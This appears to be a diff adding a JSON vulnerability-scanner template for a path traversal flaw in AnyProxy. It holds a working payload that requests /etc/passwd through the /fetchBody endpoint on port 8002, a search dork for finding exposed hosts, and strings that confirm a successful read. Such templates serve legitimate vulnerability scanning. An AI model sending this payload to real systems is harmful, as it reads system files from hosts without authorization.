@@ -1,0 +1,19 @@
+{
+    "name": "AnyProxy_Path_Traversal",
+    "method": "GET",
+    "port": [
+        8002
+    ],
+    "dork": "apps=Express",
+    "suffix": [
+        "/fetchBody?id=1/../../../../../../../../etc/passwd"
+    ],
+    "hits": [
+        "root:x:0",
+        "sshd",
+        "sbin/nologin"
+    ],
+    "references": [
+        "https://github.com/alibaba/anyproxy/issues/391"
+    ]
+}
